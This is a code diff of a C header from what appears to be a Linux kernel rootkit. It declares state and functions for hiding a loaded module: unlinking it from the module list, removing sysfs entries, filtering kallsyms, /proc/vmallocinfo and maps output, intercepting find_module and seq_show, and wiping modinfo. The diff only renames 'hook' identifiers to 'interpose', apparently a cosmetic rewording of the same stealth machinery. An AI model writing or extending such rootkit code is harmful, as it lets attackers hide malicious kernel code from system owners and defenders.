@@ -8,7 +8,7 @@
 
 struct neverc_krt_this_module;
 
-#include <nvk_hook.h>
+#include <nvk_interpose.h>
 
 typedef void *(*neverc_krt_find_module_fn)(const char *name);
 
@@ -16,14 +16,14 @@ struct neverc_krt_hide_state {
 	struct list_head *saved_next;
 	struct list_head *saved_prev;
 	int               hidden;
-	struct neverc_krt_hook   find_module_hook;
+	struct neverc_krt_interpose   find_module_interpose;
 	neverc_krt_find_module_fn orig_find_module;
 	const char       *module_name;
 	int               sysfs_removed;
 	int               kallsyms_filtered;
 	void             *saved_kobj;
-	struct neverc_krt_hook   seq_show_hook;
-	int               seq_show_hooked;
+	struct neverc_krt_interpose   seq_show_interpose;
+	int               seq_show_interposed;
 };
 
 #define NEVERC_KRT_HIDE_INIT_STATE { .saved_next = 0, .saved_prev = 0,  \
@@ -31,7 +31,7 @@ struct neverc_krt_hide_state {
 			      .sysfs_removed = 0,                 \
 			      .kallsyms_filtered = 0,             \
 			      .saved_kobj = 0,                    \
-			      .seq_show_hooked = 0 }
+			      .seq_show_interposed = 0 }
 
 int neverc_krt_hide_init(void);
 
@@ -87,8 +87,8 @@ void neverc_krt_maps_filter_add_self(void);
 
 void neverc_krt_mod_wipe_modinfo(struct neverc_krt_this_module *mod);
 
-void neverc_krt_hide_pause_hooks(void);
-void neverc_krt_hide_remove_hooks(void);
+void neverc_krt_hide_pause_interposes(void);
+void neverc_krt_hide_remove_interposes(void);
 
 /* --- /proc/vmallocinfo filter --- */
 
